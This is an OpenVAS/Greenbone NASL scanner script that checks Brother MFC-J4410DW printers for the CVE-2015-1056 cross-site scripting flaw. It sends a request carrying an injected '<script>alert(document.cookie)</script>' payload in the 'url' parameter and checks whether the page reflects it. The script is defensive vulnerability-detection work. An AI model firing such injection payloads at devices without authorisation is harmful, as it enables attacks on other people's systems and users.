# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805320");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2015-01-12 20:15:26 +0530 (Mon, 12 Jan 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2015-1056");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Brother MFC-J4410DW XSS Vulnerability (Jan 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Brother MFC-J4410DW is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of 'url' parameter in
  'status.html' page before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Brother MFC-J4410DW with F/W Versions J and K.");

  script_tag(name:"solution", value:"See the referenced advisory for a solution.");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2015/Jan/19");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

url = "/general/status.html";

res = http_get_cache(port: port, item: url);

if (!res || ">Brother MFC-J4410DW series<" >!< res)
  exit(0);

url += '?url="/><script>alert(document.cookie)</script><input type="hidden" value="';

if (http_vuln_check(port: port, url: url, check_header: TRUE,
                    pattern: "<script>alert\(document\.cookie\)</script>")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
